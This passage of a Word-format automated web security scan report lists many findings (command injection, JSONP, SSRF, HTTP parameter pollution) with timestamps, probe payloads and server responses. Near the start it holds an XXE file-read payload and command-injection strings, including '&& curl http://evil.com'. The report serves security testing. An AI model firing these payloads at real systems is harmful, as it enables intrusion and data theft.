        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:47:34.302902</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     &lt;!DOCTYPE data [&lt;!ENTITY file SYSTEM 'file:///etc/hosts'&gt;]&gt;&lt;data&gt;&amp;file;&lt;/data&gt;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127. **Possible CMDI injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:47:34.986456</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     &amp;nslookup test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128. **Possible CMDI injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:47:34.991196</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     |id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129. **Possible CMDI injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:47:34.999714</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ;whoami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130. **Possible CMDI injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:47:35.603374</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     `id`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131. **Possible CMDI injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:47:35.687842</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     $(id)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132. **Possible CMDI injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:47:35.695641</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     || ping -c 1 evil.com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133. **Possible CMDI injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:47:36.133944</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     &amp;&amp; curl http://evil.com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134. **Possible JSONP injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:47:36.798720</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     jsonp=alert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135. **Possible JSONP injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:47:36.806332</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     callback=alert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136. **Possible JSONP injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:47:36.813856</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     callback=console.log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137. **Possible JSONP injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:47:37.517250</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     cb=alert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138. **Possible JSONP injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:47:37.525148</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     callbackName=alert</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Response:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     </w:t>
        <w:br/>
        <w:t>&lt;!doctype html&gt;</w:t>
        <w:br/>
        <w:t>&lt;html lang="en"&gt;</w:t>
        <w:br/>
        <w:t>&lt;head&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">  &lt;title&gt;Server Error (500)&lt;/title&gt;</w:t>
        <w:br/>
        <w:t>&lt;/head&gt;</w:t>
        <w:br/>
        <w:t>&lt;body&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">  &lt;h1&gt;Server Error (500)&lt;/h1&gt;&lt;p&gt;&lt;/p&gt;</w:t>
        <w:br/>
        <w:t>&lt;/body&gt;</w:t>
        <w:br/>
        <w:t>&lt;/html&gt;</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">     ```</w:t>
        <w:br/>
        <w:br/>
        <w:t>🛑 **High Risk Findings**</w:t>
        <w:br/>
        <w:br/>
        <w:t>1. **SSRF endpoint accessible**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:51:29.493181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2. **SSRF endpoint accessible**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:51:29.695832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3. **SSRF endpoint accessible**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:54:35.141340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4. **SSRF endpoint accessible**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:54:35.226691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5. **SSRF endpoint accessible**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:57:40.884635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6. **SSRF endpoint accessible**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:57:41.005560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7. **SSRF endpoint accessible**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:00:46.475908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8. **SSRF endpoint accessible**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:00:46.572521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9. **SSRF endpoint accessible**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:03:52.384069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10. **SSRF endpoint accessible**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:03:52.488872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11. **SSRF endpoint accessible**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:06:58.064795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12. **SSRF endpoint accessible**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:06:58.182175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13. **SSRF endpoint accessible**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:10:03.889958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14. **SSRF endpoint accessible**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:10:03.977492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15. **SSRF endpoint accessible**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:13:09.405633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16. **SSRF endpoint accessible**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:13:09.506837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17. **SSRF endpoint accessible**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:16:14.942064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18. **SSRF endpoint accessible**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:16:15.035551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19. **SSRF endpoint accessible**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:19:20.233363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20. **SSRF endpoint accessible**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:19:20.329464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21. **SSRF endpoint accessible**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:22:25.670936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22. **SSRF endpoint accessible**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:22:25.751885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23. **SSRF endpoint accessible**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:25:30.792329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24. **SSRF endpoint accessible**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:25:30.874339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25. **SSRF endpoint accessible**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:28:36.297061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26. **SSRF endpoint accessible**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:28:36.392320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27. **SSRF endpoint accessible**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:31:41.808739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28. **SSRF endpoint accessible**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:31:41.902063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29. **SSRF endpoint accessible**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:34:47.828948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30. **SSRF endpoint accessible**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:34:47.924927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31. **SSRF endpoint accessible**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:37:53.476829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32. **SSRF endpoint accessible**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:37:53.619329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33. **SSRF endpoint accessible**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:40:59.130159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34. **SSRF endpoint accessible**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:40:59.227476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35. **SSRF endpoint accessible**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:44:05.059074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36. **SSRF endpoint accessible**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:44:05.154540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37. **SSRF endpoint accessible**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:47:10.393250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38. **SSRF endpoint accessible**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:47:10.482860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39. **SSRF endpoint accessible**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:50:16.088091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40. **SSRF endpoint accessible**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:50:16.214816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41. **SSRF endpoint accessible**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:53:21.617003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42. **SSRF endpoint accessible**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:53:21.725676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43. **SSRF endpoint accessible**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:56:28.084949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44. **SSRF endpoint accessible**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:56:28.168577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45. **SSRF endpoint accessible**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:59:33.195260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46. **SSRF endpoint accessible**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:59:33.306161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47. **SSRF endpoint accessible**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:02:38.860994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48. **SSRF endpoint accessible**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:02:38.956758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49. **SSRF endpoint accessible**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:05:44.510844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50. **SSRF endpoint accessible**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:05:44.635566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51. **SSRF endpoint accessible**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:08:50.648680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52. **SSRF endpoint accessible**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:08:50.791538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53. **SSRF endpoint accessible**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:11:56.070700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54. **SSRF endpoint accessible**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:11:56.208775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55. **SSRF endpoint accessible**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:15:02.955015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56. **SSRF endpoint accessible**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:15:03.043215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57. **SSRF endpoint accessible**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:18:12.139231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58. **SSRF endpoint accessible**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:18:12.254627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59. **SSRF endpoint accessible**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:21:17.524914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60. **SSRF endpoint accessible**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:21:17.620685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61. **SSRF endpoint accessible**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:24:23.596883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62. **SSRF endpoint accessible**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:24:23.746180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63. **SSRF endpoint accessible**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:27:28.935033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64. **SSRF endpoint accessible**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:27:29.061398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65. **SSRF endpoint accessible**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:30:34.041913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66. **SSRF endpoint accessible**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:30:34.136739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67. **SSRF endpoint accessible**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:33:41.154610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68. **SSRF endpoint accessible**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:33:41.281940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69. **SSRF endpoint accessible**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:36:49.419121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70. **SSRF endpoint accessible**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:36:49.502501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71. **SSRF endpoint accessible**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:39:56.324269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72. **SSRF endpoint accessible**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:39:56.402224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73. **SSRF endpoint accessible**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:43:02.093114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74. **SSRF endpoint accessible**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:43:02.182191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75. **SSRF endpoint accessible**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:46:07.250555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76. **SSRF endpoint accessible**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:46:07.328174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77. **SSRF endpoint accessible**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:49:14.820755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78. **SSRF endpoint accessible**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:49:14.930954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79. **SSRF endpoint accessible**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:52:21.227911</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Response:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     &lt;!DOCTYPE html&gt;&lt;html lang="en" &gt;</w:t>
        <w:br/>
        <w:t>&lt;head&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    &lt;title&gt;Attacker - The Domain Name Attacker.com is Now For Sale.&lt;/title&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    &lt;meta charset="UTF-8"&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    &lt;meta name="viewport" content="width=device-width, in</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```</w:t>
        <w:br/>
        <w:br/>
        <w:t>80. **SSRF endpoint accessible**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:52:21.323753</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Response:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     &lt;!DOCTYPE html&gt;</w:t>
        <w:br/>
        <w:t>&lt;html&gt;</w:t>
        <w:br/>
        <w:t>&lt;head&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve"> &lt;meta charset="UTF-8"&gt;</w:t>
        <w:br/>
        <w:t>&lt;/head&gt;</w:t>
        <w:br/>
        <w:t>&lt;body&gt;</w:t>
        <w:br/>
        <w:t>&lt;h1&gt;Burp Collaborator Server&lt;/h1&gt;</w:t>
        <w:br/>
        <w:t>&lt;p&gt;Burp Collaborator is a service that is used by &lt;a href="https://portswigger.net/burp/"&gt;Burp Su</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```</w:t>
        <w:br/>
        <w:br/>
        <w:t>⚠️ **Medium Risk Findings**</w:t>
        <w:br/>
        <w:br/>
        <w:t>1. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:51.800640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2. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:51.805470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3. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:51.809243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4. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:51.812464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5. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:51.815268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6. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:51.819008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7. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:51.822214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8. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:51.825444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9. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:51.828689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10. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:51.831991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11. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:51.834703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12. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:51.837965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13. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:51.841690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14. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:51.844331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15. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:51.848110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16. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:51.850208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17. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:51.851820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18. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:51.854068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19. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:51.855631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20. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:51.857631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21. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:51.859592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22. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:51.862100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23. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:51.864432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24. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:51.866574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25. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:51.868158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26. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:51.870202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27. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:51.872320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28. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:51.873945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29. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:51.876165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30. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:51.878327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31. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:51.879934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32. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:51.881542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33. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:52:57.959366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34. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:52:57.963140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35. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:52:57.966904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36. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:52:57.970105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37. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:52:57.973419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38. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:52:57.976497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39. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:52:57.979309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40. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:52:57.982848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41. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:52:57.985495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42. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:52:57.989510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43. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:52:57.992700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44. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:52:57.995499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45. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:52:57.998690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46. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:52:58.001885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47. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:52:58.006216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48. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:52:58.008374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49. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:52:58.011025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50. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:52:58.013159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51. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:52:58.015319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52. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:52:58.017508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53. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:52:58.019644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54. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:52:58.021772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55. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:52:58.023893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56. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:52:58.025993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57. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:52:58.028141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58. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:52:58.030291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59. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:52:58.032500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60. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:52:58.034628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61. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:52:58.036739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62. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:52:58.038864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63. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:52:58.041026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64. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:52:58.043174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65. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:56:03.517219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66. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:56:03.520844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67. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:56:03.524987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68. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:56:03.529473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69. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:56:03.532284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70. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:56:03.535537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71. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:56:03.538757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72. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:56:03.543764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73. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:56:03.546935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74. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:56:03.550391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75. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:56:03.554062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76. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:56:03.557526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77. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:56:03.560754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78. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:56:03.564174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79. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:56:03.567367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80. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:56:03.569610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81. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:56:03.571819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82. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:56:03.573952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83. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:56:03.575744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84. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:56:03.577875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85. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:56:03.580048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86. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:56:03.581640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87. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:56:03.583796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88. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:56:03.585942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89. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:56:03.587547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90. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:56:03.589624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91. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:56:03.591316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92. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:56:03.592906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93. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:56:03.595017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94. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:56:03.597172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95. **HPP detected**</w:t>
        <w:br/>
